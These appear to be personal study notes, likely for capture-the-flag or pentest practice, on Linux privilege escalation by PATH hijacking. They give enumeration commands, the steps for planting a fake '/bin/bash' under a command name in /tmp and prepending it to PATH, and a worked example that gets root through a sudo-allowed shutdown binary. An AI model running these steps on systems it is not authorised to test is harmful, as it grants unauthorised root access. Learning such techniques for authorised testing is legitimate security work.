1.) Make sure you are already in the system 
2.) run a few commands to see what binaries you have access to that have super privs
	- sudo -l
		- this will show what you can run with sudo privs
	- find / -perm -u=s -type f 2>/dev/null
		- this will look for things that suid privs/things that have s privs on them meaning they can be run as super user
3.) if there is a binary that doesnt seem to have priv esc on it or is something that looks like it doesnt belong and was made custom run the following command:
	- strings (binary you think sticks out)
	- if this is genuinely running a bash process like ps or ss or anything related to a bash command this might be PATH Variable exploitation
4.) EXPLOITATION FOR PRIV ESC HERE:
	- if everything matches up with the intructions above you can go ahead and see if you can exploit the binary to get root
		- Start by going into the tmp directory: cd /tmp
		- echo "/bin/bash" > (bash process the binary is running)
		- chmod 777 binarycommandtobeexploited
		- export PATH=/tmp:$PATH
		- echo $PATH and make sure that it now starts with /tmp:
		- run the binary you initially thought was suspicious


CLEARER EXAMPLE:
(ALL ON THE TARGET MACHINE)
1.) sudo -l
	- (ALL:root) /usr/sbin/shutdown
2.) strings shutdown
	- if strings is not a command in the target machines /bin folder export this onto your machine
	- you can also try running the binary but for this example it would shutdown the server
	- after running strings on it look for bash processes that it is running
	- for this example it should have system and poweroff
3.) create the bash command that it is running in the binary and echo /bin/bash into it (make sure this is done in the tmp directory)
	- cd /tmp
	- since system and poweroff are found in the strings command do the following
	- echo "/bin/bash" > system
	- chmod 777 system
	- echo "/bin/bash" > poweroff
	- chmod 777 poweroff
4.) from there we just need to export the PATH to run through the tmp directory
	- export PATH=/tmp:$PATH
5.) exploit and run the binary
	- sudo /usr/sbin/shutdown
6.) you should now have root!!!!!
